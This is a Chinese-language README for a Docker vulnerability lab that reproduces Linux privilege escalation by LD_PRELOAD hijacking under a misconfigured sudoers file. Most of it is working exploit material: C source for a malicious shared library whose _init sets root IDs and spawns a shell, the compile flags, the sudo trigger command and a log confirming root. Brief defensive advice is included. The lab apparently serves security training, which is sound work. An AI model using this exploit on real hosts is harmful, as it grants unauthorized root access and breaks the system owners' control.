# LD_PRELOAD 环境变量劫持

## 原理

LD_PRELOAD 环境变量让动态链接器在程序启动时**预先加载指定 .so 共享库**。
正常情况下 sudo/setuid 程序会清除 LD_PRELOAD（安全机制）；但当 sudoers 配置了
`Defaults env_keep += "LD_PRELOAD"`（或使用 sudo -E），且用户能 sudo 执行任意
程序时，恶意 .so 的构造函数 `_init()` 会在 **root 权限**下执行，实现提权。

## 环境

- 基础镜像：ubuntu:20.04（含 gcc）
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：sudoers 中 `Defaults env_keep += "LD_PRELOAD"` + `lowpriv ALL=(root) NOPASSWD: /usr/bin/find`

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 写恶意共享库 (源码见 evil.c)
cat > /tmp/evil.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

# 4. 编译 (必须 -nostartfiles, 入口函数 _init)
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# 5. 触发: sudo 执行任意程序并注入 LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find . -quit
# 预期输出: root@...:/#   提权成功!

# 6. 一键利用
bash exploit.sh
```

## 为什么能成功

- env_keep 配置让 sudo 保留 LD_PRELOAD 环境变量
- sudo 以 root 运行 find 时, 动态链接器先加载 /tmp/evil.so
- _init() 构造函数在 root 进程中执行 setuid(0) + 弹 shell

## 注意（踩坑记录）

- 编译必须用 `-nostartfiles` 且函数名必须是 `_init`
- setresuid/setresgid 需要 `#define _GNU_SOURCE`（否则编译警告）
- sudo 默认 env_reset 会清除 LD_PRELOAD, 必须显式 env_keep 或 sudo -E

## 防御

- sudoers 不保留 LD_PRELOAD/LD_LIBRARY_PATH
- 设置 Defaults secure_path

## 验证记录

2026-08-26 真实环境验证：编译后 `echo 'id; exit' | sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find . -quit`
输出 `uid=0(root) gid=0(root)`。复现成功。
